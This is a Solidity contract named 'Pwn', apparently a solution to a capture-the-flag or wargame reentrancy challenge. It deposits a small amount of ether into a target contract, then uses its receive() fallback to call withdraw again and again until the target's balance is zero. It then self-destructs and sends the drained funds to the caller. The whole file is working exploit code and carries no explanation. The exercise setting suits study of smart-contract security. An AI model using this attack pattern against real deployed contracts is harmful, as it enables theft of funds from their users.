// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Pwn {

    IReentrancy private immutable target;
    uint256 private constant AMOUNT = 0.001 ether;
    
    constructor(address _target) {
        target = IReentrancy(_target);
    }

    function pwn() payable external {
        require(msg.value == AMOUNT, "wrong amount");
        target.donate{value: AMOUNT}(address(this));
        target.withdraw(AMOUNT);
        require(address(target).balance == 0, "balance greater than 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(AMOUNT);
        }
    }
}